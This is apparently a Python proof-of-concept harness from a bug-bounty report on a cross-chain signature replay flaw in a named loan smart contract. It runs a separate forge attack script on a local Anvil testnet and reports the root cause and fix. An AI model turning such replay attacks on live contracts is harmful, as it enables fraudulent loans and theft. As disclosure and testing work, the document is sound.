#!/usr/bin/env python3
"""
PoC: Loan.predictLoanTermHash() missing block.chainid -> cross-chain signature replay
Finding: F4 -- MEDIUM
Target:  gluwa/CCNext-smart-contracts / contracts/Loan/Loan.sol
Program: SpaceCoin CertIK SkyShield

Demonstrates:
  - predictLoanTermHash() hashes address(this) + params but NOT block.chainid
  - Signatures produced on Chain A (chainId=2370, Creditcoin) are accepted
    unchanged on Chain B (chainId=11155111, Ethereum Sepolia) when the contract
    is deployed at the same address (e.g. via CREATE2 / deterministic deployer)
  - createLoanTerm() succeeds with replayed cross-chain signatures

Usage:
    cd ~/CCNext-smart-contracts
    python3 ../bug-bounty-reports/SpaceCoin-CertIK/poc_loan_crosschain_replay.py
"""

import subprocess
import sys
import time
import os
import signal

REPO_DIR    = os.path.expanduser("~/CCNext-smart-contracts")
SCRIPT_PATH = "script/PocLoanCrossChainReplay.s.sol"
ANVIL_PORT  = 8548
ANVIL_HOST  = f"http://127.0.0.1:{ANVIL_PORT}"
LENDER_KEY  = "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80"

SEP = "=" * 70


def start_anvil():
    print("[*] Starting local Anvil testnet ...")
    proc = subprocess.Popen(
        ["anvil", "--port", str(ANVIL_PORT), "--silent"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    time.sleep(1.5)
    if proc.poll() is not None:
        print("[!] Anvil failed to start -- is it installed? (brew install foundry)")
        sys.exit(1)
    print(f"[*] Anvil running on {ANVIL_HOST} (PID {proc.pid})")
    return proc


def run_forge_script():
    print(f"[*] Running forge script: {SCRIPT_PATH}")
    print()
    result = subprocess.run(
        [
            "forge", "script", SCRIPT_PATH,
            "--tc", "PocLoanCrossChainReplay",
            "--rpc-url", ANVIL_HOST,
            "--broadcast",
            "--private-key", LENDER_KEY,
        ],
        capture_output=True,
        text=True,
        cwd=REPO_DIR,
    )
    return result


def parse_and_display(result):
    combined = result.stdout + result.stderr

    log_lines = []
    for line in combined.splitlines():
        stripped = line.strip()
        if any(stripped.startswith(p) for p in
               ("[deploy]", "[sign]", "[check]", "[replay]", "===",
                "Signatures", "predictLoanTermHash", "Same contract",
                "Fix:", "Root cause")):
            log_lines.append(stripped)

    # Deduplicate while preserving order (forge prints logs twice: sim + broadcast)
    seen = set()
    unique_lines = []
    for line in log_lines:
        if line not in seen:
            seen.add(line)
            unique_lines.append(line)

    if not unique_lines:
        print("[!] Could not parse forge output -- printing raw stdout:")
        print(result.stdout[-4000:] if len(result.stdout) > 4000 else result.stdout)
        if result.returncode != 0:
            print("[!] STDERR:")
            print(result.stderr[-2000:] if len(result.stderr) > 2000 else result.stderr)
        return result.returncode == 0

    print(SEP)
    print("  SpaceCoin -- F4: Loan.predictLoanTermHash() Missing chainId Replay PoC")
    print(SEP)
    print()
    for line in unique_lines:
        print(" ", line)
    print()

    if "ATTACK CONFIRMED" in combined:
        print(SEP)
        print("  RESULT: VULNERABILITY CONFIRMED")
        print("  Signatures produced for chainId=2370 accepted on chainId=11155111.")
        print("  createLoanTerm() succeeds with replayed cross-chain signatures.")
        print("  Root cause: block.chainid not in predictLoanTermHash().")
        print("  Fix: add block.chainid to hash or use EIP-712 domain separator.")
        print(SEP)
        return True
    else:
        print("[!] Expected '=== ATTACK CONFIRMED ===' not found.")
        if result.returncode != 0:
            print("[!] Exit code:", result.returncode)
            print(result.stderr[-1000:])
        return False


def main():
    print()
    print(SEP)
    print("  SpaceCoin F4 -- Loan.predictLoanTermHash() Missing chainId")
    print("  Cross-Chain Signature Replay Attack PoC")
    print(SEP)
    print()

    anvil = start_anvil()
    try:
        result = run_forge_script()
        ok = parse_and_display(result)
        sys.exit(0 if ok else 1)
    finally:
        print()
        print("[*] Shutting down Anvil ...")
        anvil.send_signal(signal.SIGTERM)
        anvil.wait()
        print("[*] Done.")


if __name__ == "__main__":
    main()
